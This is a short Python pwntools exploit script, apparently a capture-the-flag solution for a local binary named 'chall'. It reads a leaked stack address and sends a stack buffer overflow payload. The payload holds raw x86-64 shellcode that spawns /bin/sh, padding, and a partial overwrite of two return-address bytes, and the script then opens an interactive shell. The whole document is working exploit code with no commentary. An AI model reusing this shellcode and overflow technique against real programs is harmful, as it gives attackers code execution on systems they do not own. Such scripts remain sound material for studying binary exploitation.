from pwn import *


pc = process("./chall")

len_of_buf = 256
shell = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

buff = pc.recvuntil(b"\n")
buff = buff[buff.find(b"0") : -1]
buff = int(buff, 16)
log.info("buff @ {}".format(hex(buff)))

target = bytes.fromhex(hex(buff)[-4:])[::-1]
log.info(str(target))

payload = b"A" * 8 + p64(buff + 16) + shell + b"A" * (len_of_buf - 8 - 8 - len(shell))
payload += target


# gdb.attach(pc,'break *0x401306')
pc.sendline(payload)
pc.interactive()
